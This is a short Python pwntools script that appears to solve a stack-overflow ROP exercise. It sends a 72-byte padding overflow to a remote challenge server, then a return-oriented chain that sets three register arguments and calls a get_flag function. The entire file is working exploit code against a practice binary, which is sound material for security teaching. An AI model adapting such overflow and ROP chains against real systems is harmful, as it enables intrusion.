from pwn import *

port = 10033
rem = remote("kayle.snu.ac.kr", port)

elf = ELF('./Stack Overflow with ROP/problem/prob')

flag_addr = elf.symbols['get_flag']
pop_rdi_addr = elf.symbols['gadget1']
pop_rsi_addr = elf.symbols['gadget2']
pop_rdx_addr = elf.symbols['gadget3']

rem.sendlineafter(b"username: ", b"A")

payload = b'A' * 72
payload += p64(pop_rdi_addr) + p64(0x1111)
payload += p64(pop_rsi_addr) + p64(0x2222)
payload += p64(pop_rdx_addr) + p64(0x3333)
payload += p64(flag_addr)
rem.sendlineafter(b"back? ", payload)

rem.recvline()
print(rem.recvall())